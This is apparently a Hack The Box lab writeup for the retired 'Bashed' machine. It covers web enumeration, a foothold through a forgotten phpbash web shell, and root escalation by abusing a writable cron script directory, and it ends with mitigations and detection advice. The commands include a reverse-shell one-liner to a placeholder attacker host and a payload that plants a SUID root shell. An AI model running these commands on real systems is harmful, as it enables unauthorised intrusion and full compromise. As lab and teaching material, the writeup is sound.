---
machine: Bashed
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, web, webshell, sudo, cron, suid]
---

# Bashed — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A single Apache host serving a developer site. `/dev/` still holds `phpbash.php`, a web shell the admin left behind, so the foothold is instant as `www-data`. Escalation comes from a passwordless `sudo -u scriptmanager` and a root cron that runs every `.py` in `/scripts/`, a directory `scriptmanager` can write to.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
80/tcp  open  http  Apache httpd 2.4.18 ((Ubuntu))
```

One port only. The page title, "Arrexel's Development Site", already hints at a test environment.

## Enumeration

```bash
gobuster dir -u http://<IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php,txt -t 40
```

```text
/dev        (Status: 301)
/uploads    (Status: 301)
/php        (Status: 301)
/images     (Status: 301)
/css        (Status: 301)
/js         (Status: 301)
/fonts      (Status: 301)
/config.php (Status: 200)
```

`/dev` contains two files:

```bash
curl -s http://<IP>/dev/ -o - | grep -o 'href="[^"]*"'
# phpbash.php
# phpbash.min.php
```

## Foothold

```text
http://<IP>/dev/phpbash.php
```

The page is a web console running commands as the Apache user:

```text
www-data@bashed:/var/www/html/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No exploit: a developer tool stayed in production and hands commands to anyone. For comfort, spawn a reverse shell from it:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1'
```

## Escalation

```bash
sudo -l
```

```text
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

That allows acting as `scriptmanager`, owner of `/scripts`, where `test.py` lives. A root-owned `test.txt` with a fresh timestamp sits next to it:

```bash
ls -la /scripts
# -rwxr--r-- 1 root          root          ... test.txt
# -rwxr--r-- 1 scriptmanager scriptmanager ... test.py
```

`pspy`, or simply waiting, confirms root runs those scripts every minute. Since the web shell filters redirections, write with `tee`:

```bash
echo "import os; os.system('cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash')" \
  | sudo -u scriptmanager tee /scripts/test.py
```

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ... /tmp/rootbash
/tmp/rootbash -p -c "cat /root/root.txt"
```

`-p` keeps the euid and `-c` runs without a TTY, which is all a web shell gives you.

## Evidence

- `id` in the web shell → `www-data`.
- `ls -la /tmp/rootbash` with the SUID bit.
- `cat /root/root.txt` (redacted).

## Lessons learned

- Developer tools in production are a free foothold: `phpbash`, `adminer`, `phpinfo`, test consoles.
- Passwordless `sudo -u user` does not give a shell, but it does let you write wherever that user can.
- A root cron over a directory another user can write is direct escalation, even when the original script is harmless.
- `tee` solves writes when the shell does not honour `>`.
- `bash -p` is mandatory with SUID: without it the euid is dropped.

## Mitigations and detection

- Never leave web shells or admin utilities in the web root; if needed, behind authentication and outside production.
- Review `sudo -l` per role: `(user) NOPASSWD: ALL` is equivalent to that user.
- Root cron jobs must not execute code from directories writable by others; keep ownership root and mode 0755.
- Alert on SUID files created outside package paths and on writes to `/scripts`, `/etc/cron.*`.
- MITRE: T1505.003 (web shell), T1053.003 (cron), T1548.001 (SUID).

## References

- GTFOBins: `bash`, `tee`.
- MITRE ATT&CK: T1505.003, T1053.003, T1548.001.
